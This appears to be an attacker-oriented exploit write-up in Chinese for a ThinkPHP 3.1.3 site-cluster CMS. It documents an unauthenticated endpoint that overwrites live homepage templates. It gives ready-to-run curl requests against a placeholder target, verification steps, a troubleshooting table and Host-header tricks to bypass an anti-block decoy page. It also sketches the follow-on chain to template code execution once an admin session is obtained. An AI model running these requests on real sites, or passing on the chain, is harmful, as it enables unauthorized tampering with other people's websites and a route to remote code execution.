# ThinkPHP3.1.3 站群 CMS：Home/Order::get_html1 零凭证覆盖线上模板文件

## 0. 结论
该站群 Home 组的 `OrderAction` **不继承 CommonAction**（所以 Home 组鉴权与 REQUEST_URI 层 WAF 一起被跳过），其 `get_html1()` 零凭据可调：
每次调用会 `file_get_contents` 本站 `List/index` 的渲染结果，再 `file_put_contents` 覆盖
`App/Tpl/Home/Index_index.html` 与 `App/Tpl/Home/Index_indexapp.html`。

性质是 **未授权任意模板文件写入（模板烘焙原语）**，不等于 RCE —— 见 §4。

## 1. 前置条件 / 指纹
- 目标是这套 SomCNS / ThinkPHP 3.1.3 站群：
  - `GET /index.php?g=Home&m=List&a=index&type=0` 返回带 `about="<数字>"` 的列表页；
  - `GET /App/Tpl/Admin/Public_left.html` 零凭据可直读（nginx 把 Tpl 当静态文件直出）。
- PHP 进程对 `App/Tpl/Home/` 有写权限（该站群默认部署即满足）。
- 入口建议用 `/index.php?g=...&m=...&a=...`，伪静态路径亦可；vhost 部署必须带正确 Host/SNI。

## 2. 请求（无 Cookie、无凭据）
```bash
T=https://TARGET          # 换成目标主域名

# 0) 基线：读取写入探针（该动作自己写 time()）
curl -k -s --noproxy '*' "$T/Upload/atop/attime3_5.txt"

# 1) 触发（关键一步，零凭据）
curl -k -s -i --noproxy '*' "$T/index.php?g=Home&m=Order&a=get_html1"
#    → HTTP/1.1 200，body: {"ok":1}
#      部分版本回 {"ok":1,"msg":"成功请刷新"}

# 2) 复读探针
curl -k -s --noproxy '*' "$T/Upload/atop/attime3_5.txt"
```

## 3. 判据（满足其中两条即可判定成立）
1. 步骤 1 返回 **200 且 body 为 `{"ok":1...}`**（对照：不存在的 action 会给 nginx 404）。
2. **`/Upload/atop/attime3_5.txt` 数值逐次跳变** —— 该文件内容就是 `time()`，变化即证明服务端真的重跑了烘焙逻辑。
3. **模板文件被覆盖，且覆盖内容 = 本站自己的渲染结果**：
```bash
curl -k -s --noproxy '*' "$T/App/Tpl/Home/Index_index.html"        | md5sum
curl -k -s --noproxy '*' "$T/index.php?g=Home&m=List&a=index&type=0" | md5sum
curl -k -s --noproxy '*' "$T/App/Tpl/Home/Index_indexapp.html"      | md5sum
curl -k -s --noproxy '*' "$T/index.php?g=Home&m=List&a=index&type=1" | md5sum
# 两组 md5 各自相等 ⇒ 写入内容确为本站 List 页渲染结果，不是别站/缓存
```
若 Tpl 不能被静态直读，用 `-o /dev/null -w '%{size_download}\n'` 比对调用前后的字节数变化。

## 4. 为什么没闭合到命令执行
- 烘焙源是**本站自身的 List/index**，抓取 URL 硬编码指向本站域名 ⇒ **内容源不可由外部控制**。
- 要打穿必须是「List 页会渲染的字段里出现可控字符串」：`article.title`、`cat.description`、`cat.you` 等
  （模板里带 `|htmlspecialchars_decode` 输出，库里转义的 `&lt;php&gt;` 会被还原成 `<php>`）。
- 这些字段只能从 **admin 后台**（需会话）或**同源 DB** 写入；该目标的会员线（前台会员账号）没有对应可写字段，
  因此缺最后一个「凭据写库入口」，本条只能停在「匿名可覆盖模板文件」。
- 一旦拿到后台会话，正确顺序是：写 `article.title` / `cat.description` →
  再跑一次 `get_html1` 烘焙 → 用触发分支的 Host 访问首页 → 模板编译执行。
- 反过来：若目标上已存在任意写 `.php` 的点，直接走那条，不必绕模板链。

## 5. 触发渲染时的 Host 分支（覆盖了不等于被渲染）
```php
// Home/IndexAction::index()
if (strpos($domain,'sp') !== false) { display('indexapp'); }        // → Index_indexapp.html
elseif (strpos($domain, '<防封关键字>') !== false) { display('indexalert'); } // → 防封壳页，不渲染被污染模板
else { display(); }                                                // → Index_index.html ★ 用这种 Host
```
所以：覆盖后要么用不含 `sp`、不含防封关键字的域名访问首页，要么走 `Index_indexapp.html` 分支的同名域名，
否则看到的是小体积防封页，会误判「没写进去」。

## 6. 常见失败原因
| 现象 | 原因 |
|---|---|
| 404 / nginx 错误页 | 控制器/动作不在该安装上（精简版可能没有 Order 的这个方法），或入口路径不对 |
| 200 但探针时间戳不变 | `App/Tpl/Home/` 不可写；或 `file_get_contents` 抓取失败（`strlen($content) > 100` 才写，抓取失败时是 `false`） |
| 模板字节数变了、前台首页没变 | 用了含 `sp` 或防封关键字的 Host，`display()` 走进了别的分支 |
| 首页变成小体积壳页 | 同上，命中了 `indexalert` 防封分支，不是写入失败 |
| 想确认「真写入」但模板不能直读 | 只能靠 `/Upload/atop/attime3_5.txt`（time()）+ `jquery3_5.txt` 字节数双重 oracle |

## 7. 注意
- `Home/Order/all_lock` 同样是零凭据（同一个 `extends Action`），但它会
  `M("article")->setField(lock=1)` **改业务数据**，只做只读验证时不要触发。
- 并发保持 1、间隔 ≥1.5s；本机若有系统代理必须加 `--noproxy '*'`，否则回显会被代理污染。
